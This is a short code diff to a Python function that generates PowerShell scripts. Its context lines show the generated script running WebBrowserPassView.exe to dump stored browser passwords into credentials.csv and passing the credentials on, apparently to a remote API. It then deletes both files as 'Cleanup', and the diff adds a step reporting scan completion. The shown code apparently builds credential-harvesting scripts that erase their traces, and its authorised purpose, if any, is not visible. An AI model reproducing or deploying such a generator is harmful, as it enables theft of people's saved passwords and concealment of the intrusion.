@@ -155,6 +155,14 @@ def generate_script(generation_type, payload, api_key):
             'credentials',
             '$using:credentials'
         )
-        script_contents += 'Remove-Item .\WebBrowserPassView.exe; Remove-Item .\credentials.csv # Cleanup\r\n'
+        script_contents += 'Remove-Item .\WebBrowserPassView.exe; Remove-Item .\credentials.csv # Cleanup\r\n\r\n'
+
+    
+    script_contents += get_data(
+        'Mark Scan Completion',
+        'end_scan',
+        'completed',
+        'completed'
+    )
 
     return script_contents
